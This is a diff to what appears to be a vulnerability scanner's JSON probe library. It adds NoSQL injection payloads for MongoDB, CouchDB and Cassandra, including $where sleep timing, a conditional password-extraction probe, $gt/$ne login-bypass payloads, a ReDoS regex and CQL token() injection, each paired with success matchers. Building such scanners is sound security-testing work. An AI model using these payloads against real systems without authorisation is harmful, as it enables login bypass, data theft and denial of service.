@@ -119,6 +119,143 @@
         }
       ]
     },
+    "mongodb_blind": {
+      "description": "MongoDB blind injection \u2014 boolean-based and time-based probes for blind NoSQL injection scenarios",
+      "tech_match": ["MongoDB", "Express", "Node.js", "Mongoose", "MEAN"],
+      "param_match": ["username", "password", "email", "login", "user", "filter", "search", "query", "id", "name"],
+      "probes": [
+        {
+          "payload": "{\"$regex\":\"^a.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*!$\"}",
+          "description": "MongoDB ReDoS regex probe \u2014 catastrophic backtracking via nested quantifiers; timing diff >3s confirms $regex is evaluated server-side",
+          "matchers": [
+            {"type": "timing", "min_ms": 3000}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$where\":\"sleep(3000)\"}",
+          "description": "MongoDB $where time-based blind (3s delay) \u2014 server-side JS execution via sleep; timing >2800ms confirms $where evaluation",
+          "matchers": [
+            {"type": "timing", "min_ms": 2800}
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$where\":\"this.password.match(/^a/) ? sleep(3000) : 1\"}",
+          "description": "MongoDB conditional blind extraction \u2014 sleep triggers only if password starts with 'a'; timing confirms data extraction capability via $where",
+          "matchers": [
+            {"type": "timing", "min_ms": 2800}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "mongodb_auth_bypass": {
+      "description": "MongoDB authentication bypass \u2014 operator injection on password fields to bypass login without valid credentials",
+      "tech_match": ["MongoDB", "Express", "Node.js", "Mongoose", "MEAN"],
+      "param_match": ["password", "passwd", "pass", "pwd", "secret"],
+      "probes": [
+        {
+          "payload": "{\"$gt\":\"\"}",
+          "description": "MongoDB $gt auth bypass on password \u2014 matches any non-empty password; status 200 with auth tokens or session data confirms bypass",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "not_word", "words": ["invalid", "incorrect", "failed", "unauthorized", "wrong password"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$ne\":\"impossible_password_value_swk_probe\"}",
+          "description": "MongoDB $ne auth bypass on password \u2014 matches all passwords except the impossible value; successful login response confirms injection",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "not_word", "words": ["invalid", "incorrect", "failed", "unauthorized", "wrong password"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "couchdb": {
+      "description": "CouchDB NoSQL injection \u2014 Mango query injection and view manipulation",
+      "tech_match": ["CouchDB", "Node.js", "Express"],
+      "param_match": ["username", "password", "email", "login", "user", "filter", "search", "query", "id", "selector"],
+      "probes": [
+        {
+          "payload": "{\"$gt\":null}",
+          "description": "CouchDB Mango $gt null injection \u2014 matches all documents in CouchDB Mango queries; response size increase confirms operator processing",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50},
+            {"type": "word_count_diff", "min_diff": 5}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'\"{}",
+          "description": "CouchDB syntax breaker \u2014 triggers CouchDB-specific error messages; bad_request or invalid_json confirms CouchDB backend",
+          "matchers": [
+            {"type": "status", "status": [400, 500]},
+            {"type": "word", "words": ["bad_request", "invalid_json", "badarg", "invalid UTF-8", "couchdb"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{\"selector\":{\"_id\":{\"$gt\":null}},\"limit\":1}",
+          "description": "CouchDB Mango _find injection \u2014 full Mango selector query; docs array in response confirms Mango query execution",
+          "matchers": [
+            {"type": "word", "words": ["docs", "_id", "_rev"], "condition": "or"},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "cassandra": {
+      "description": "Cassandra CQL injection \u2014 probes for Cassandra Query Language injection in applications using Cassandra as backend",
+      "tech_match": ["Cassandra", "Java", "Spring", "Node.js"],
+      "param_match": ["username", "password", "email", "id", "key", "name", "filter", "query"],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "CQL syntax break \u2014 single quote triggers Cassandra-specific syntax errors; SyntaxException or line X:Y format confirms CQL injection surface",
+          "matchers": [
+            {"type": "status", "status": [400, 500]},
+            {"type": "word", "words": ["SyntaxException", "line 1:", "InvalidQueryException", "no viable alternative", "CQL"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' OR token(id)>0--",
+          "description": "CQL token-based injection \u2014 Cassandra token() function used for range scans; response diff or token-related error confirms CQL parsing",
+          "matchers": [
+            {"type": "status", "status": [200, 400, 500]},
+            {"type": "word", "words": ["SyntaxException", "InvalidQueryException", "token"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {}
+        }
+      ]
+    },
     "detection": {
       "description": "Generic NoSQL injection detection \u2014 probes that work across MongoDB, CouchDB, and other NoSQL databases",
       "tech_match": ["MongoDB", "CouchDB", "Express", "Node.js"],
@@ -162,7 +299,7 @@
           "description": "NoSQL syntax breaker \u2014 special characters that break NoSQL query syntax; 500 error or MongoDB error message confirms injection surface",
           "matchers": [
             {"type": "status", "status": [500]},
-            {"type": "word", "words": ["MongoError", "SyntaxError", "JsonParseException", "Unexpected token"], "condition": "or"}
+            {"type": "word", "words": ["MongoError", "SyntaxError", "JsonParseException", "Unexpected token", "bad_request", "CQL", "SyntaxException", "couchdb"], "condition": "or"}
           ],
           "severity": "medium",
           "confidence_boost": 40,
